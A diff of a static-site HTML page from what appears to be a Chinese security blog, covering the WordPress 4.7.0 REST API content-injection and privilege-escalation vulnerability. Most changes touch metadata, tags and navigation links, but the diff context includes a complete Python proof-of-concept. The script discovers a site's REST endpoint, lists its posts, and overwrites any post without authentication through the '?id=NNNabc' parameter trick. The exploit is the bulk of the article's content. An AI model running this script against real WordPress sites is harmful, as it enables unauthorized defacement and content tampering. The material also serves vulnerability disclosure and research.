@@ -9,21 +9,18 @@
   <title>WordPress REST API 内容注入/权限提升漏洞 | NoSec World</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="WordPress 在 4.7.0 版本后集成了原 REST API 插件的功能，并默认启用，设置为非Plain模式，使用 WordPress 程序的网站首页上会有：
-1&amp;lt;link rel=&amp;quot;https://&amp;quot; href=&amp;quot;http://wp-json/&amp;quot;&amp;gt;
-API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
+1&amp;lt;link rel=&amp;quot;https://&amp;quot; href=&amp;quot;http://wp-json/&amp;quot;&amp;gt;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WordPress REST API 内容注入/权限提升漏洞">
 <meta property="og:url" content="https://adrain09.github.io/2017/02/06/漏洞记录/WordPress REST API 内容注入_权限提升漏洞/index.html">
 <meta property="og:site_name" content="NoSec World">
 <meta property="og:description" content="WordPress 在 4.7.0 版本后集成了原 REST API 插件的功能，并默认启用，设置为非Plain模式，使用 WordPress 程序的网站首页上会有：
-1&amp;lt;link rel=&amp;quot;https://&amp;quot; href=&amp;quot;http://wp-json/&amp;quot;&amp;gt;
-API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
-<meta property="og:updated_time" content="2017-02-07T04:54:27.838Z">
+1&amp;lt;link rel=&amp;quot;https://&amp;quot; href=&amp;quot;http://wp-json/&amp;quot;&amp;gt;">
+<meta property="og:updated_time" content="2017-02-07T04:56:12.598Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WordPress REST API 内容注入/权限提升漏洞">
 <meta name="twitter:description" content="WordPress 在 4.7.0 版本后集成了原 REST API 插件的功能，并默认启用，设置为非Plain模式，使用 WordPress 程序的网站首页上会有：
-1&amp;lt;link rel=&amp;quot;https://&amp;quot; href=&amp;quot;http://wp-json/&amp;quot;&amp;gt;
-API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
+1&amp;lt;link rel=&amp;quot;https://&amp;quot; href=&amp;quot;http://wp-json/&amp;quot;&amp;gt;">
   
     <link rel="alternative" href="/atom.xml" title="NoSec World" type="application/atom+xml">
   
@@ -197,6 +194,7 @@ API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
       
         <p>WordPress 在 4.7.0 版本后集成了原 REST API 插件的功能，并默认启用，设置为非Plain模式，使用 WordPress 程序的网站首页上会有：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;https://&quot; href=&quot;http://wp-json/&quot;&gt;</div></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>API 地址则为：<a href="http://wp-json/，通过该API的GET和POST请求，未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改，严重情况下，可以出现敏感数据泄露。" target="_blank" rel="external">http://wp-json/，通过该API的GET和POST请求，未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改，严重情况下，可以出现敏感数据泄露。</a>  </p>
 <p>poc：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_api_url</span><span class="params">(wordpress_url)</span>:</span></div><div class="line">    response = urllib2.urlopen(wordpress_url)</div><div class="line"></div><div class="line">    data = etree.HTML(response.read())</div><div class="line">    u = data.xpath(<span class="string">'//link[@rel="https://api.w.org/"]/@href'</span>)[<span class="number">0</span>]</div><div class="line"></div><div class="line">    <span class="comment"># check if we have permalinks</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'rest_route'</span> <span class="keyword">in</span> u:</div><div class="line">        print(<span class="string">' ! Warning, looks like permalinks are not enabled. This might not work!'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> u</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_posts</span><span class="params">(api_base)</span>:</span></div><div class="line">    respone = urllib2.urlopen(api_base + <span class="string">'wp/v2/posts'</span>)</div><div class="line">    posts = json.loads(respone.read())</div><div class="line"></div><div class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</div><div class="line">        print(<span class="string">' - Post ID: &#123;&#125;, Title: &#123;&#125;, Url: &#123;&#125;'</span></div><div class="line">              .format(post[<span class="string">'id'</span>], post[<span class="string">'title'</span>][<span class="string">'rendered'</span>], post[<span class="string">'link'</span>]))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_post</span><span class="params">(api_base, post_id, post_content)</span>:</span></div><div class="line">    <span class="comment"># more than just the content field can be updated. see the api docs here:</span></div><div class="line">    <span class="comment"># https://developer.wordpress.org/rest-api/reference/posts/#update-a-post</span></div><div class="line">    data = json.dumps(&#123;</div><div class="line">        <span class="string">'content'</span>: post_content</div><div class="line">    &#125;)</div><div class="line"></div><div class="line">    url = api_base + <span class="string">'wp/v2/posts/&#123;post_id&#125;/?id=&#123;post_id&#125;abc'</span>.format(post_id=post_id)</div><div class="line">    req = urllib2.Request(url, data, &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;)</div><div class="line">    response = urllib2.urlopen(req).read()</div><div class="line"></div><div class="line">    print(<span class="string">'* Post updated. Check it out at &#123;&#125;'</span>.format(json.loads(response)[<span class="string">'link'</span>]))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_usage</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'Usage: &#123;&#125; &lt;url&gt; (optional: &lt;post_id&gt; &lt;file with post_content&gt;)'</span>.format(__file__))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="comment"># ensure we have at least a url</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print_usage()</div><div class="line">        sys.exit(<span class="number">1</span>)</div><div class="line"></div><div class="line">    <span class="comment"># if we have a post id, we need content too</span></div><div class="line">    <span class="keyword">if</span> <span class="number">2</span> &lt; len(sys.argv) &lt; <span class="number">4</span>:</div><div class="line">        print(<span class="string">'Please provide a file with post content with a post id'</span>)</div><div class="line">        print_usage()</div><div class="line">        sys.exit(<span class="number">1</span>)</div><div class="line"></div><div class="line">    print(<span class="string">'* Discovering API Endpoint'</span>)</div><div class="line">    api_url = get_api_url(sys.argv[<span class="number">1</span>])</div><div class="line">    print(<span class="string">'* API lives at: &#123;&#125;'</span>.format(api_url))</div><div class="line"></div><div class="line">    <span class="comment"># if we only have a url, show the posts we have have</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</div><div class="line">        print(<span class="string">'* Getting available posts'</span>)</div><div class="line">        get_posts(api_url)</div><div class="line"></div><div class="line">        sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="comment"># if we get here, we have what we need to update a post!</span></div><div class="line">    print(<span class="string">'* Updating post &#123;&#125;'</span>.format(sys.argv[<span class="number">2</span>]))</div><div class="line">    <span class="keyword">with</span> open(sys.argv[<span class="number">3</span>], <span class="string">'r'</span>) <span class="keyword">as</span> content:</div><div class="line">        new_content = content.readlines()</div><div class="line"></div><div class="line">    update_post(api_url, sys.argv[<span class="number">2</span>], <span class="string">''</span>.join(new_content))</div><div class="line"></div><div class="line">    print(<span class="string">'* Update complete!'</span>)</div></pre></td></tr></table></figure>
@@ -304,8 +302,8 @@ API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
 <nav id="article-nav">
   
   
-    <a href="/2017/02/05/安全测试/XXE in uber/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Uber xxe漏洞</div>
+    <a href="/2017/02/05/web安全/JAVA1.7+ XXE实体入侵/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">java 1.7+ xxe入侵</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -370,23 +368,11 @@ API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">安全测试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">漏洞记录</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">软件</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">智能硬件</a>
+                <a href="javascript:void(0)">安全测试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -394,7 +380,19 @@ API 地址则为：http://wp-json/，通过该API的GET和POST请求，未">
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">智能硬件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">漏洞记录</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">移动安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">软件</a>
               </li>
             
             <div class="clearfix"></div>
